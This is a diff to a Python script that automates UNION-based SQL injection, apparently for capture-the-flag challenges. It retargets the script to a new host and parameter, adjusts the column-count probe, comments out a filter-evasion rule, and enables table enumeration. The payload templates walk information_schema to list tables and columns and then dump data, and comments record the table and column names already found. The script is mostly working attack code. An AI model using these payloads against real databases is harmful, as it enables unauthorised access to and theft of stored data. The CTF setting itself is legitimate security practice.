@@ -5,20 +5,20 @@ import re
 
 from requests_html import AsyncHTMLSession, HTMLSession
 
-url = 'http://86bd606e-069f-4c18-80a1-40f1c6bcc140.challenge.ctf.show:8080/index.php?id='
+url = 'http://1.14.71.254:28076/?wllm='
 # flag_success = '欢迎'
 failed_text = 'error'
 
-fuzz_column_num = "1' union select {}%23"
+fuzz_column_num = "-1' union select {}%23"
 payload_database = "-1' UNion {} %23"
 payload_table    = "-1' UNion {} from information_schema.tables where table_schema=database()%23"
 payload_column   = "-1' UNion {} from information_schema.columns where table_name='{}'%23"
 payload_data     = "-1' UNion {} from {}%23"
 
-key = "username"
-fuzz = {
-    ' ': '/**/'
-}
+# key = "wllm"
+# fuzz = {
+#     ' ': '/**/'
+# }
 
 start_time = time.time()
 session = HTMLSession()
@@ -84,7 +84,7 @@ if __name__ == '__main__':
     select = go('column_num', fuzz_column_num)
     init(select)
     # go('database', payload_database)  # 'kanwolongxia'
-    # go('table', payload_table)  # 'loflag'
+    go('table', payload_table)  # 'loflag'
     # go('column', payload_column.format(table_name))  # Id,flaglo
     go('data', payload_data.format(column_name, table_name))
     print("--- %s seconds ---" % (time.time() - start_time))
